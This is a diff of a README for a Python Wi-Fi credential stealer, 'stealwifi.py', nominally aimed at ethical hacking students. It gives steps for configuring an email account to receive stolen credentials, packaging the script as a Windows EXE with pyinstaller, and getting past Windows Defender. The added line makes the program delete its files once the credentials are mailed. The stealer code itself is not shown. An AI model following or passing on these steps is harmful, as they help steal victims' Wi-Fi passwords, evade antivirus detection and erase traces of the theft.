@@ -9,6 +9,7 @@ This code created for ethical hacking students. All responsibility on you ;)
 1) Change sender, reciever and password informations in code,
 2) Use pyinstaller for convert to EXE => pyinstaller stealwifi.py --onefile
 3) If you know how to make FUD malware, u can work on it. But, if you convert to EXE directly, Windows Defender will not block EXE file.
+4) You have to write EXE files name in the code, before make EXE file. So, when you get creds by mail, all files will be deleted automatically.
 ***********************************************************************
 # AntiScan.Me
 
